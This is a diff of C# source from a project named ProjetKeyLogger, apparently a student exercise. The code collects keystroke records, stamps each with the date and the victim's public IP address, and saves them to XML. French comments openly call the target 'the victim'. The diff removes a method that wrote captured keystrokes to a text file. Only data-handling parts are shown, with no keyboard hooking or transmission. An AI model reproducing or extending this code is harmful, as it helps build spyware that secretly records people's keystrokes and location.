@@ -18,6 +18,10 @@ namespace ProjetKeyLogger
             {
                 return list_enregistrement;
             }
+            set
+            {
+                list_enregistrement = value;
+            }
         }
 
         //Constructeur
@@ -30,6 +34,9 @@ namespace ProjetKeyLogger
         //Ajoute un enregistrement a la collection
         public void ajouter(Enregistrement enregistrement)
         {
+            //On définit l'adresse ip publique
+            enregistrement.adresseIpPublique();
+
             //mise a jour de la date
             enregistrement.dateTimeNow();
 
@@ -37,34 +44,6 @@ namespace ProjetKeyLogger
             list_enregistrement.Add(enregistrement);
         }
 
-        //Méthode qui écrit la saisie dans un .txt
-        private void enregistreTxt(int texte)
-        {
-
-            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
-            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-
-            chemin_Dossier = "C:/Users/Charlie/OneDrive/Etudes/M2 OPSIE/Csharp/ProjetEspion";
-
-            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
-            if (Directory.Exists(chemin_Dossier))
-            {
-                Directory.CreateDirectory(chemin_Dossier);
-            }
-
-            //Création du fichier texte
-            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
-            {
-
-            }
-
-            //Ecriture
-            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
-            {
-                sw.Write(texte);
-
-            }
-        }
 
         //sauvegarde dans un fichier XML
         public void saveToXml(string file_path)
